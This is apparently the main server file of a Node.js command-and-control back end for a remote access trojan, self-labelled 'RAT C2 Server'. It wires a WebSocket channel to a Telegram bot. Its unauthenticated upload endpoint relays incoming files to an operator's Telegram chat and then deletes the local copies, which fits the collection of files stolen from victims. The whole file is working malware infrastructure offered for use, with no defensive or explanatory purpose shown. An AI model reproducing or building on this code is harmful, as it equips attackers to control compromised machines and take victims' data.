require('dotenv').config();
const express = require('express');
const http = require('http');
const path = require('path');
const multer = require('multer');
const fs = require('fs');
const { setupWSConnection } = require('./ws');
const { setupBot } = require('./bot');
const { validateEnv } = require('./utils');

// Validate environment variables
validateEnv();

const app = express();
const server = http.createServer(app);
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// File upload setup
const upload = multer({ storage: multer.memoryStorage() });
const FILE_STORAGE = path.join(__dirname, '../files');
if (!fs.existsSync(FILE_STORAGE)) fs.mkdirSync(FILE_STORAGE);

// Telegram bot setup
const bot = setupBot();

// WebSocket server setup
setupWSConnection(server, bot);

// File upload endpoint
app.post('/upload', upload.single('file'), (req, res) => {
  if (!req.file) return res.status(400).send('No file uploaded');
  
  const fileId = Date.now() + '-' + Math.round(Math.random() * 1E9);
  const filePath = path.join(FILE_STORAGE, fileId);
  
  fs.writeFile(filePath, req.file.buffer, (err) => {
    if (err) {
      console.error('File save error:', err);
      return res.status(500).send('Error saving file');
    }
    
    bot.sendDocument(process.env.ADMIN_CHAT_ID, filePath, {}, {
      filename: req.file.originalname
    }).then(() => {
      fs.unlink(filePath, () => {});
    });
    
    res.send('File uploaded successfully');
  });
});

// Landing page
app.get('/', (req, res) => {
  res.send('<h1 align="center">RAT C2 Server</h1>');
});

// Health check
app.get('/health', (req, res) => {
  res.json({ status: 'ok', timestamp: new Date() });
});

// Start server
server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Telegram bot: https://t.me/${bot.options.username}`);
  console.log(`WebSocket: ws://localhost:${PORT}`);
});